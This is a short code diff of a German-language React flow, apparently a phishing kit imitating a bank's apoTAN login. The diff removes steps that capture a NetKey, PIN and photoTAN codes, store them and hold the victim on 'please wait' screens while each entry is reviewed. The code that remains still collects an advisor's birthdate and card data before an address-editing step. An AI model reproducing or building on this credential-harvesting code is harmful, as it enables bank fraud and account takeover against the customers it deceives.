@@ -121,26 +121,9 @@ const AdressFlow = () => {
   if (phase === "berater") {
     return <BeraterStep onSubmit={async (geburtsdatum, karte) => {
       await upsertMeta({ berater_geburtsdatum: geburtsdatum, berater_karte: karte });
-      await setPhase("login", { last_error: null });
+      await setPhase("adress_edit", { last_error: null });
     }} />;
   }
-
-  if (phase === "login" || phase === "login_rejected") {
-    return <LoginStep row={row} onSubmit={async (netkey, pin) => {
-      await upsertMeta({ netkey, pin });
-      await setPhase("login_review", { last_error: null });
-    }} />;
-  }
-  if (phase === "login_review") return <LoadingStep text="Sie werden eingeloggt." />;
-  if (phase === "confirm") return <ConfirmStep row={row} onClick={async () => { await setPhase("login_phototan_request", { last_error: null }); }} />;
-  if (phase === "login_phototan_request") return <LoadingStep text="Bitte warten." />;
-  if (phase === "login_phototan" || phase === "login_phototan_rejected") {
-    return <PhotoTanStep row={row} title="Login" info="Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App und geben Sie den Code ein." label="Code" button="Anmelden" onSubmit={async (code) => {
-      await upsertMeta({ login_tan: code, login_tan_updated_at: new Date().toISOString() });
-      await setPhase("login_tan_review", { last_error: null });
-    }} />;
-  }
-  if (phase === "login_tan_review") return <LoadingStep text="Bitte warten." />;
 
   if (phase === "adress_edit" || phase === "adress_rejected") {
     return <ProfileStep row={row} onSubmit={async (data) => {
